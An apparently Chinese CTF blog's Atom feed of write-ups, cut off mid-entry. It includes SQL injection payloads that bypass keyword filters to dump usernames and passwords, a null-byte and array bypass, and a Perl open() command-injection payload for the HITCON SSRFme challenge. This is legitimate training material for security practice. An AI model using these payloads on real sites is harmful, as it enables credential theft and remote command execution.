<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Da4er&#39;s Blogs</title>
  
  <subtitle>学而专，专而精。</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://da4er.top/"/>
  <updated>2020-02-08T14:40:34.017Z</updated>
  <id>https://da4er.top/</id>
  
  <author>
    <name>Da4er&#39;s</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2.8 [极客大挑战 2019]BuyFlag&amp;BabySQL</title>
    <link href="https://da4er.top/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL.html"/>
    <id>https://da4er.top/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL.html</id>
    <published>2020-02-08T14:38:51.000Z</published>
    <updated>2020-02-08T14:40:34.017Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><h3 id="BuyFlag"><a href="#BuyFlag" class="headerlink" title="BuyFlag"></a>BuyFlag</h3><p><strong>查看网页源代码找到一处php代码：</strong></p><img src="/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/1.png" class title="Da4er"><p><strong>抓包查看：将user=1</strong></p><img src="/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/2.png" class title="Da4er"><p><strong>然后绕过is_numeric函数，通过%00截断绕过。</strong></p><img src="/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/3.png" class title="Da4er"><p><strong>然后需要money字段，用到数组绕过。</strong></p><img src="/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/4.png" class title="Da4er"><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password&#x3D;404%00&amp;money[]&#x3D;100000000</span><br></pre></td></tr></table></figure><hr><h3 id="BabySQL"><a href="#BabySQL" class="headerlink" title="BabySQL"></a>BabySQL</h3><p><strong>通过分析发现过滤了：and，or，union，select等关键字，但是可以双写绕过，有可显字段，使用普通的sql注入语句加上双写关键字即可完成注入。</strong></p><img src="/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/5.png" class title="Da4er"><img src="/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/6.png" class title="Da4er"><img src="/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/7.png" class title="Da4er"><p>使用的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">查询表名</span><br><span class="line">admin&amp;password&#x3D;admin1%27uniunionon%20selselectect%201%2C2%2Cgroup_concat(table_name)%20frfromom%20infoorrmation_schema.tables%20whwhereere%20table_schema%3Ddatabase()%23</span><br><span class="line"></span><br><span class="line">查询字段名</span><br><span class="line">admin&amp;password&#x3D;admin1%27uniunionon%20selselectect%201%2C2%2Cgroup_concat(column_name)%20frfromom%20infoorrmation_schema.columns%20whwhereere%20table_schema%3Ddatabase()%20anandd%20table_name%3D%27b4bsql%27%23</span><br><span class="line"></span><br><span class="line">查询字段内容</span><br><span class="line">username&#x3D;admin&amp;password&#x3D;admi&#39; uniunionon selselectect 1,group_concat(concat_ws(&#39;:&#39;,username,passwoorrd)),3 frofromm b4bsql --+</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;h3 id=&quot;BuyFlag&quot;&gt;&lt;a href=&quot;#BuyFlag&quot; class=&quot;headerlink&quot; title=&quot;BuyFlag&quot;&gt;&lt;/a&gt;Buy
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2.8 [SUCTF2018]followme</title>
    <link href="https://da4er.top/2-8-SUCTF2018-followme.html"/>
    <id>https://da4er.top/2-8-SUCTF2018-followme.html</id>
    <published>2020-02-08T13:08:55.000Z</published>
    <updated>2020-02-08T13:09:48.205Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><p><strong>查看流量包：发现数据包有很多http协议，直接导出http对象。</strong></p><img src="/2-8-SUCTF2018-followme/1.png" class title="Da4er"><img src="/2-8-SUCTF2018-followme/2.png" class title="Da4er"><p><strong>仔细分析后发现：这个是爆破admin密码的流量，找到爆破密码的地方，一个一个查看password字段的值，得到flag</strong></p><img src="/2-8-SUCTF2018-followme/3.png" class title="Da4er">]]></content>
    
    <summary type="html">
    
      
      
        &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;p&gt;&lt;strong&gt;查看流量包：发现数据包有很多http协议，直接导出http对象。&lt;/strong&gt;&lt;/p&gt;
&lt;img src=&quot;/2-8-SUCTF2
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2.8 [SUCTF2018]single dog</title>
    <link href="https://da4er.top/2-8-SUCTF2018-single-dog.html"/>
    <id>https://da4er.top/2-8-SUCTF2018-single-dog.html</id>
    <published>2020-02-08T12:43:27.000Z</published>
    <updated>2020-02-08T12:44:44.110Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><p><strong>拿到题目是张图片，binwalk分离出一个txt</strong></p><img src="/2-8-SUCTF2018-single-dog/1.png" class title="Da4er"><p>打开txt文件发现是aaencode加密</p><img src="/2-8-SUCTF2018-single-dog/2.png" class title="Da4er"><p>到这里我遇到的坑出来了，对aaencode解密可以使用控制台解密，但是解密出来的是</p><img src="/2-8-SUCTF2018-single-dog/3.png" class title="Da4er"><p>然后又看了这道题，把所有的jpg隐写的方法都试了一遍还是没有flag。<br>最后其实就是aaencode解密，以前遇到的是直接alert()出来flag，但是这个题不一样，需要找到在线网站解密。<br><a href="https://www.qtool.net/decode" target="_blank" rel="noopener">aaencode解密网址</a><br>用这个网站解码出来：</p><img src="/2-8-SUCTF2018-single-dog/4.png" class title="Da4er"><p>得到flag。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;p&gt;&lt;strong&gt;拿到题目是张图片，binwalk分离出一个txt&lt;/strong&gt;&lt;/p&gt;
&lt;img src=&quot;/2-8-SUCTF2018-sing
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2.7 [SUCTF 2019]Game</title>
    <link href="https://da4er.top/2-7-SUCTF-2019-Game.html"/>
    <id>https://da4er.top/2-7-SUCTF-2019-Game.html</id>
    <published>2020-02-07T15:25:55.000Z</published>
    <updated>2020-02-07T15:27:59.478Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><p><strong>查看源代码找到一串base32，解码得：suctf{hAHaha_Fak3_F1ag}，显然是个假的flag。</strong></p><img src="/2-7-SUCTF-2019-Game/1.png" class title="This is an test image"><p><strong>接着在图片中寻找，找到一个des加密的字符串：U2FsdGVkX1+zHjSBeYPtWQVSwXzcVFZLu6Qm0To/KeuHg8vKAxFrVQ==</strong></p><img src="/2-7-SUCTF-2019-Game/2.png" class title="This is an test image"><p>DES加密的字符串都是以<strong>U2FsdGVkX1</strong>开头的。<br>用在线网站解码des，使用3DES解码：密码为假的flag</p><img src="/2-7-SUCTF-2019-Game/3.png" class title="This is an test image"><p>得到flag：flag{U_F0und_1t}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;p&gt;&lt;strong&gt;查看源代码找到一串base32，解码得：suctf{hAHaha_Fak3_F1ag}，显然是个假的flag。&lt;/strong&gt;&lt;/p
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2.7 [HITCON 2017]SSRFme</title>
    <link href="https://da4er.top/2-7-HITCON-2017-SSRFme.html"/>
    <id>https://da4er.top/2-7-HITCON-2017-SSRFme.html</id>
    <published>2020-02-07T14:58:11.000Z</published>
    <updated>2020-02-07T14:59:08.064Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><p><strong>首先拿到源码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) &#123;</span><br><span class="line">        $http_x_headers &#x3D; explode(&#39;,&#39;, $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]);</span><br><span class="line">        $_SERVER[&#39;REMOTE_ADDR&#39;] &#x3D; $http_x_headers[0];</span><br><span class="line">    &#125;</span><br><span class="line">    echo $_SERVER[&quot;REMOTE_ADDR&quot;];</span><br><span class="line">    $sandbox &#x3D; &quot;sandbox&#x2F;&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    $data &#x3D; shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));</span><br><span class="line">    $info &#x3D; pathinfo($_GET[&quot;filename&quot;]);</span><br><span class="line">    $dir  &#x3D; str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;]));</span><br><span class="line">    @mkdir($dir);</span><br><span class="line">    @chdir($dir);</span><br><span class="line">    @file_put_contents(basename($info[&quot;basename&quot;]), $data);</span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure><p>主要代码是这个部分：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  $sandbox &#x3D; &quot;sandbox&#x2F;&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    $data &#x3D; shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));</span><br><span class="line">    $info &#x3D; pathinfo($_GET[&quot;filename&quot;]);</span><br><span class="line">    $dir  &#x3D; str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;]));</span><br><span class="line">    @mkdir($dir);</span><br><span class="line">    @chdir($dir);</span><br></pre></td></tr></table></figure><p><strong>代码逻辑为：1.创建一个’orange/客户端ip哈希值’的目录；2.将传入的URL带入命令GET执行 — GET是Lib for WWW in Perl中的命令 目的是模拟http的GET请求；3.解析filename参数，传入filename的最后一级文件夹（获取不为空）并创建。</strong></p><img src="/2-7-HITCON-2017-SSRFme/1.png" class title="This is an test image"><hr><p><strong>解法有很多，但是我在做的时候主要用的open()函数绕过检测机制的方法。</strong><br><strong>首先通过上面代码的逻辑访问网站根目录：<br>创建一个名为a的文件，通过url参数访问根目录，那么访问的信息就会存储在a文件下。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;&amp;filename&#x3D;a</span><br><span class="line">sandbox&#x2F;0a3519231615f5dcb5681b439c71d89c&#x2F;a</span><br></pre></td></tr></table></figure><img src="/2-7-HITCON-2017-SSRFme/2.png" class title="This is an test image"><p>看到有个readflag。<br>其次用到了perl语言的open函数参数是可控的，可以执行任意命令。<br><strong>这里要明确一点perl的GET命令是调用open函数来实现执行命令的。</strong><br>下面是截取别的大佬博客wp中的一段：</p><img src="/2-7-HITCON-2017-SSRFme/3.png" class title="This is an test image"><p><strong>这个意思有两点：1.在file.pm中open函数参数可控；2.file.pm先判断(file:文件名)中的文件是否存在，才能执行文件名对应的命令。</strong><br>所以最终的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url&#x3D;file:bash -c &#x2F;readflag|&amp;filename&#x3D;bash -c &#x2F;readflag|  创建相应的同名文件。</span><br><span class="line">url&#x3D;file:bash -c &#x2F;readflag|&amp;filename&#x3D;da4er   利用open执行代码。</span><br><span class="line">最后直接访问&#x2F; sandbox &#x2F;哈希值&#x2F; 123就能得到flag。</span><br></pre></td></tr></table></figure><img src="/2-7-HITCON-2017-SSRFme/4.png" class title="This is an test image">)<hr><p>参考博客：<br><a href="https://www.jianshu.com/p/3f82685f56a8" target="_blank" rel="noopener">1</a><br><a href="http://momomoxiaoxi.com/2017/11/08/HITCON/" target="_blank" rel="noopener">2</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;p&gt;&lt;strong&gt;首先拿到源码：&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2.7 [极客大挑战 2019]Knife&amp;LoveSQL&amp;Http</title>
    <link href="https://da4er.top/2-7-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife-LoveSQL-Http.html"/>
    <id>https://da4er.top/2-7-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife-LoveSQL-Http.html</id>
    <published>2020-02-07T14:27:03.000Z</published>
    <updated>2020-02-07T14:28:22.098Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><h3 id="Knife"><a href="#Knife" class="headerlink" title="Knife"></a>Knife</h3><p><strong>题目提示找到shell，shell密码都给了，直接用菜刀连接，得到flag。</strong></p><img src="/2-7-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife-LoveSQL-Http/1.png" class title="This is an test image"><hr><h3 id="LoveSQL"><a href="#LoveSQL" class="headerlink" title="LoveSQL"></a>LoveSQL</h3><p><strong>简单的sql注入题目，没用任何过滤机制。所以使用最简单的sql注入语句即可。</strong><br>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;1 --+</span><br><span class="line">and 1&#x3D;2 --+</span><br><span class="line">order by 3 --+</span><br><span class="line">union select 1,2,3 --+</span><br><span class="line">union select 1,database(),version() --+</span><br><span class="line">union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() --+</span><br><span class="line">union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; --+</span><br><span class="line">union select 1,username,password from users limit 0，1--+ or (union select 1,2,group_concat(concat_ws(&#39;:&#39;,username,password)) from users --+)</span><br></pre></td></tr></table></figure><p>将对应的表名换成题目中的表名即可</p><img src="/2-7-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife-LoveSQL-Http/2.png" class title="This is an test image"><hr><h3 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h3><p><strong>这道题目主要考察http头部信息的理解和利用。</strong><br><strong>首先查看源码找到Secret.php</strong></p><img src="/2-7-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife-LoveSQL-Http/3.png" class title="This is an test image"><p><strong>接下来就是https头部的构造了，如图构造了三个http头部信息：User-Agent；Referer；X-Forwared-For。</strong></p><img src="/2-7-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife-LoveSQL-Http/4.png" class title="This is an test image">]]></content>
    
    <summary type="html">
    
      
      
        &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;h3 id=&quot;Knife&quot;&gt;&lt;a href=&quot;#Knife&quot; class=&quot;headerlink&quot; title=&quot;Knife&quot;&gt;&lt;/a&gt;Knife&lt;/h3
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>[GXYCTF2019]gakki</title>
    <link href="https://da4er.top/GXYCTF2019-gakki.html"/>
    <id>https://da4er.top/GXYCTF2019-gakki.html</id>
    <published>2020-02-07T13:03:42.000Z</published>
    <updated>2020-02-07T13:07:22.989Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><p><strong>先binwalk分离图片的压缩包：</strong></p><img src="/GXYCTF2019-gakki/1.png" class title="This is an test image"><p><strong>得到的压缩包有密码，尝试爆破。</strong></p><img src="/GXYCTF2019-gakki/2.png" class title="This is an test image"><p><strong>看到flag.txt有很多字符，想到字符频率，用脚本或者HxD查看都可以。</strong></p><img src="/GXYCTF2019-gakki/3.png" class title="This is an test image"><img src="/GXYCTF2019-gakki/4.png" class title="This is an test image"><p>附上解题脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">def processLine(line, CharacterCounts):</span><br><span class="line">    for character in line:</span><br><span class="line">        #if ord(character) in range(97, 123):</span><br><span class="line">        if ord(character) in range(32,126):</span><br><span class="line">            CharacterCounts[character] +&#x3D; 1</span><br><span class="line">  </span><br><span class="line">#创建字母字典</span><br><span class="line">def createCharacterCounts(CharacterCounts):</span><br><span class="line">    #for i in range(97, 123):</span><br><span class="line">    for i in range(32, 126):</span><br><span class="line">        CharacterCounts[chr(i)] &#x3D; 0</span><br><span class="line">  </span><br><span class="line">def main():</span><br><span class="line">    #用户输入一个文件名</span><br><span class="line">    # filename &#x3D; input(&quot;enter a filename:&quot;).strip()</span><br><span class="line">    filename &#x3D; &quot;flag.txt&quot;</span><br><span class="line">    infile &#x3D; open(filename, &quot;r&quot;)</span><br><span class="line">      </span><br><span class="line">    #建立用于计算词频的空字典</span><br><span class="line">    CharacterCounts &#x3D; &#123;&#125;</span><br><span class="line">    #初始化字典键值</span><br><span class="line">    createCharacterCounts(CharacterCounts)</span><br><span class="line">    for line in infile:</span><br><span class="line">        #processLine(line.lower(), CharacterCounts)</span><br><span class="line">        processLine(line, CharacterCounts)</span><br><span class="line">          </span><br><span class="line">    #从字典中获取数据对</span><br><span class="line">    pairs &#x3D; list(CharacterCounts.items())</span><br><span class="line">  </span><br><span class="line">    #列表中的数据对交换位置,数据对排序</span><br><span class="line">    items &#x3D; [[x,y] for (y,x) in pairs] </span><br><span class="line">    items.sort(reverse&#x3D;True)</span><br><span class="line">  </span><br><span class="line">    #输出count个数词频结果</span><br><span class="line">    for i in range(len(items)):</span><br><span class="line">        #print(items[i][1]+&quot;\t&quot;+str(items[i][0]))</span><br><span class="line">        print(items[i][1],end&#x3D;&#39;&#39;)</span><br><span class="line">          </span><br><span class="line">    infile.close()</span><br><span class="line">          </span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;p&gt;&lt;strong&gt;先binwalk分离图片的压缩包：&lt;/strong&gt;&lt;/p&gt;
&lt;img src=&quot;/GXYCTF2019-gakki/1.png&quot; c
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2.7 [GXYCTF2019]Is this base?</title>
    <link href="https://da4er.top/2-7-GXYCTF2019-Is-this-base.html"/>
    <id>https://da4er.top/2-7-GXYCTF2019-Is-this-base.html</id>
    <published>2020-02-07T12:45:22.000Z</published>
    <updated>2020-02-07T12:56:11.886Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><p><strong>首先打开题目发现有很多行base64，想到base64隐写。所谓的base64隐写就是通过在base64最后几个字节中隐藏信息，所以要使用很多行来存储信息。看到有很多行base64首先要想到base64隐写！</strong></p><hr><img src="/2-7-GXYCTF2019-Is-this-base/1.png" class title="This is an test image"><p>使用脚本跑即可，附上脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">b64chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'1.txt'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        bin_str = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">            stegb64 = <span class="string">''</span>.join(line.split())</span><br><span class="line">            rowb64 =  <span class="string">''</span>.join(stegb64.decode(<span class="string">'base64'</span>).encode(<span class="string">'base64'</span>).split())</span><br><span class="line">            offset = abs(b64chars.index(stegb64.replace(<span class="string">'='</span>,<span class="string">''</span>)[<span class="number">-1</span>])-b64chars.index(rowb64.replace(<span class="string">'='</span>,<span class="string">''</span>)[<span class="number">-1</span>]))</span><br><span class="line">            equalnum = stegb64.count(<span class="string">'='</span>) <span class="comment">#no equalnum no offset</span></span><br><span class="line">            <span class="keyword">if</span> equalnum:</span><br><span class="line">                bin_str += bin(offset)[<span class="number">2</span>:].zfill(equalnum * <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">print</span> <span class="string">''</span>.join([chr(int(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, len(bin_str), <span class="number">8</span>)])</span><br></pre></td></tr></table></figure><p><strong>得到flag</strong></p><img src="/2-7-GXYCTF2019-Is-this-base/2.png" class title="This is an test image">]]></content>
    
    <summary type="html">
    
      
      
        &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;p&gt;&lt;strong&gt;首先打开题目发现有很多行base64，想到base64隐写。所谓的base64隐写就是通过在base64最后几个字节中隐藏信息，所以要
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>博客图片无法正常显示说明</title>
    <link href="https://da4er.top/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87%E6%97%A0%E6%B3%95%E6%AD%A3%E5%B8%B8%E6%98%BE%E7%A4%BA%E8%AF%B4%E6%98%8E.html"/>
    <id>https://da4er.top/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87%E6%97%A0%E6%B3%95%E6%AD%A3%E5%B8%B8%E6%98%BE%E7%A4%BA%E8%AF%B4%E6%98%8E.html</id>
    <published>2020-02-07T11:20:21.000Z</published>
    <updated>2020-02-07T12:31:22.395Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><p><strong>这两天重新装了一下hexo博客，在处理上传图片时发现，用之前的markdown格式上传本地图片网页不在显示，通过百度知道可以使用如下语法：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% asset_img test.jpg This is an test image %&#125;</span><br></pre></td></tr></table></figure><p><strong>所以我们将之前的上传的图片都改成这种格式，写个python脚本批量改即可。</strong><br>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_blog_image</span><span class="params">(text)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(text, <span class="string">'r+'</span>, encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        r = fp.readlines()</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">"new"</span>, <span class="string">"w+"</span>, encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> fp1:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> r:</span><br><span class="line">                <span class="keyword">if</span> (i.startswith(<span class="string">"!["</span>)):</span><br><span class="line">                    a = i.split(<span class="string">".png"</span>)</span><br><span class="line"><span class="comment">#只能更改博客10张图片</span></span><br><span class="line">                    num = a[<span class="number">0</span>][<span class="number">-1</span>:]</span><br><span class="line">                    <span class="comment"># print(num)</span></span><br><span class="line">                    b = <span class="string">"&#123;% asset_img "</span> + <span class="string">"&#123;0&#125;.png"</span>.format(num) + <span class="string">" This is an test image %&#125;"</span></span><br><span class="line">                    rep = i</span><br><span class="line">                    i = i.replace(rep, b)</span><br><span class="line">                    fp1.write(i + <span class="string">"\n"</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    fp1.write(i)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    text=input()</span><br><span class="line">    change_blog_image(text)</span><br><span class="line">    os.remove(text)</span><br><span class="line">    os.rename(<span class="string">'new'</span>,text)</span><br></pre></td></tr></table></figure><p><strong>说明一下：这个脚本只能改图片只有10张的博客(保存在本地的图片格式为：数字(1,2,3,4….).png)。</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;p&gt;&lt;strong&gt;这两天重新装了一下hexo博客，在处理上传图片时发现，用之前的markdown格式上传本地图片网页不在显示，通过百度知道可以使用如下语
      
    
    </summary>
    
    
      <category term="随笔" scheme="https://da4er.top/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="随便" scheme="https://da4er.top/tags/%E9%9A%8F%E4%BE%BF/"/>
    
  </entry>
  
  <entry>
    <title>2.7 [GXYCTF2019]佛系青年</title>
